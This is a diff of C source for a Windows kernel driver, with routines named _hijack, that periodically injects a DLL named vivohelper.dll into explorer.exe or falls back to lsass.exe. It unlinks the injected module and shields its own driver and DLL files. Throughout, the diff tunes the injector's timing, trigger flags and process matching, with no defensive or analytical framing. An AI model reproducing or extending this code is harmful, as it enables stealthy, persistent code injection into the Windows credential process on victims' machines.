@@ -8,19 +8,21 @@
 
 #define DELAY_ONE_MICROSECOND (-10)
 #define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
-//#define TARGET_PNAME_1 "dllCaller.exe"
-#define TARGET_PNAME_1 "explorer.exe"
-#define TARGET_PNAME_2 "lsass.exe"
-#define TARGET_DLL_FOR_INJECT L"C:\\Windows\\vivohelper.dll"
-#define TARGET_SYS_TO_PROTECTED L"vivohelper.sys"
-#define TARGET_DLL_TO_PROTECTED L"vivohelper.dll"
-#define INJECT_SPLIT (4*2) // second(s) 21600s = 360m = 6h = quater 
-#define HEART_BEAT_ADDRESS (0x1ff00)
+//#define TARGET_PNAME_1 "dllcaller.exe" // Must be lower case
+#define TARGET_PNAME_1 "explorer.exe" // Must be lower case
+//#define TARGET_PNAME_1 "winrdlv3.exe" // Must be lower case
+#define TARGET_PNAME_2 "lsass.exe" // Must be lower case
+#define TARGET_DLL_FOR_INJECT L"c:\\windows\\vivohelper.dll"
+#define TARGET_SYS_TO_PROTECTED L"vivohelper.sys" // Must be lower case
+#define TARGET_DLL_TO_PROTECTED L"vivohelper.dll" // Must be lower case
+#define INJECT_SPLIT (604800) // second(s) 21600s = 360m = 6h = quater = 1/7 * 1/4 * 604800
+#define INIT_RVA (0x00002430)
 #define INVALID_PID (-1)
 
 #define _FILE_PROTECTION_WAY_1_
-#define _PROCESS_PROTECTION_
+//#define _PROCESS_PROTECTION_
 #define _THREAD_INJECT_
+#define _THREAD_INJECT_CALLED_
 
 
 #ifdef _FILE_PROTECTION_WAY_1_
@@ -848,7 +850,7 @@ long GetPidByPName(char* PName) {
 			ObDereferenceObject(eproc);
 			/*
 			*/
-			if (!strcmp(PName, (char*)PsGetProcessImageFileName(eproc))) {
+			if (!strcmp(_strlwr(PName), _strlwr((char*)PsGetProcessImageFileName(eproc)))) {
 				pid = (long)((char*)PsGetProcessId(eproc) - (char*)0);
 				break;
 			}
@@ -868,14 +870,6 @@ VOID MyThreadFunc(IN PVOID context)
 	(void*)context;
 	NTSTATUS status = STATUS_SUCCESS;
 	INJECT_DLL data = { IT_Thread };
-	PROTECT_MEMORY in;
-	COPY_MEMORY cp;
-	ULONG timeStamp_old;
-	ULONG timeStamp_new;
-	ULONG last_pid;
-
-	
-	timeStamp_old = timeStamp_new = 0;
 
 	wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT);
 	wcscpy_s(data.initArg, 512, L"");
@@ -883,42 +877,19 @@ VOID MyThreadFunc(IN PVOID context)
 	data.initRVA = 0;
 	data.wait = TRUE; // must be TRUE
 	data.unlink = TRUE;
-	data.erasePE = TRUE;
-
-	in.base = HEART_BEAT_ADDRESS;
-	in.size = sizeof(ULONG);
-	in.newProtection = PAGE_READWRITE;
-
-	cp.localbuf = &timeStamp_new;
-	cp.targetPtr = HEART_BEAT_ADDRESS;
-	cp.size = sizeof(ULONG);
-	cp.write = FALSE;
-
-	last_pid = GetPidByPName(TARGET_PNAME_1);
-	last_pid = last_pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : last_pid;
+	data.erasePE = FALSE;
 	/*
 	*/
 	for (;;) {
-		MySleep(INJECT_SPLIT * 1000);
 		data.pid = GetPidByPName(TARGET_PNAME_1);
 		data.pid = data.pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : data.pid;
-		DbgPrint("[+] data.pid [%d]\n", data.pid);
+		/*
+		*/
 		if (data.pid == INVALID_PID) continue;
-		if (data.pid != last_pid) { // pid changed
-			in.pid = data.pid;
-			BBProtectMemory(&in);
-		}
-		cp.pid = data.pid;
-		BBCopyMemory(&cp);
-		DbgPrint("[+] wassup time stamp old new [%d] [%d]\n", timeStamp_old, timeStamp_new);
-		if (timeStamp_old == timeStamp_new) { // heart not beating
-			status = BBInjectDll(&data);
-			DbgPrint("[+] return of inject [%d]\n", status);
-		}
-		timeStamp_old = timeStamp_new;
-		last_pid = data.pid;
+		status = BBInjectDll(&data); // 0 if success
+		MySleep(INJECT_SPLIT * 1000);
 	}
-/*
+	/*
 	*/
 
 	/*
@@ -932,6 +903,20 @@ VOID MyThreadFunc(IN PVOID context)
 VOID _hijack(PDRIVER_OBJECT DriverObject) {
 	NTSTATUS status = STATUS_SUCCESS;
 	(void*)status;
+#if 0
+
+	INJECT_DLL data = { IT_Thread };
+	wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT);
+	wcscpy_s(data.initArg, 512, L"");
+	data.type = IT_Apc; // can't be IT_Thread nor IT_MMap
+	data.initRVA = 0;
+	data.wait = TRUE; // must be TRUE
+	data.unlink = TRUE;
+	data.erasePE = FALSE;
+	data.pid = GetPidByPName(TARGET_PNAME_1);
+	status = BBInjectDll(&data);
+	DbgPrint("[+] return of inject [%x]\n", status);
+#endif
 
 	// [+] ---------- process protection ----------
 #ifdef _PROCESS_PROTECTION_
@@ -995,7 +980,7 @@ _Exit_DriverEntry:
 
 
 	// [+] ---------- Thread Inject ----------
-#ifdef _THREAD_INJECT_
+#ifdef _THREAD_INJECT_CALLED_
 	//#if 0
 	HANDLE hThread;
 	// KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
@@ -1022,7 +1007,8 @@ _Exit_DriverEntry:
 VOID _hijack_Unload()
 {
 	// [+] ---------- Thread Inject ----------
-#ifdef _THREAD_INJECT_
+#ifdef _THREAD_INJECT_CALLED_
+	//#if 0
 	KeSetEvent(&pdx.evKill, 0, FALSE);
 	KeWaitForSingleObject(pdx.thread, Executive, KernelMode, FALSE, NULL);
 	ObDereferenceObject(pdx.thread);
